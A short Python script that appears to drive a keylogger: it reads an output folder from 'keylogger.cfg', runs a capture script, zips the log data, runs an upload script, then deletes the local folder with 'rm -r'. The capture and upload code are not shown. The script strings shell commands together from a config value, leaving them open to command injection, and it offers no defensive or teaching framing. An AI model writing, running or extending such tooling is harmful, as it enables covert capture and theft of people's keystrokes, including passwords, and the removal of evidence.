import os
import configparser

config = configparser.ConfigParser()
config.read('keylogger.cfg')
directory = str(config['Output']['OutputDirectoryFullPath'])

os.system('pwd > wd.txt')
wd = open('wd.txt', 'r+')
wd2 = wd.read()
wd2 = wd2.replace('\n', '')
wd2 = str(wd2)
wd.close()
os.system('rm wd.txt')

directory = wd2 + directory

os.system('python testkey.py')
os.system('zip -rj ' + directory + '/logdata.zip ' + directory)
os.system('python upload_db.py')
os.system('rm -r ' + directory)
